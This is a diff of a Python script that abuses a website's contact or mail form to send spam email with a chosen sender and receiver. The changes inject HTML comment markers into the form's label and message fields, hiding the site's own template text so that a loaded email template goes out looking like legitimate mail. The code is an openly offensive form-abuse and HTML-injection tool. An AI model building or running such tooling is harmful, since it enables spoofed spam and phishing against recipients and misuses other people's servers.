@@ -48,7 +48,7 @@ def mailList(txt):
 def loadTemplate(txt):
     try:
         f = open(txt,'rb')
-        return f
+        return f.read().decode('utf-8')
     except:
         print(Style.BRIGHT+Fore.RED+"File '{}' not found".format(txt))
 
@@ -77,12 +77,16 @@ def spamMail(url,sender,receiver,temp):
     }
 )
     headers = {"Content-Type":"application/x-www-form-urlencoded"}
+    templateX = '-->'+loadTemplate(temp)
     data = {
+        'name_lbl' : '<!--',
+        'email_lbl': 'Scripting',
+        'msg_lbl' : 'By Eagle Eye',
         'name':'Supporter',
         'email': sender,
         'rcvEmail' : receiver,
-        'subject' : 'This is subject',
-        'message' : loadTemplate(temp),
+        'subject' : 'This is subject 3',
+        'message' : templateX,
         'submit' : 'send'
     }
     try:
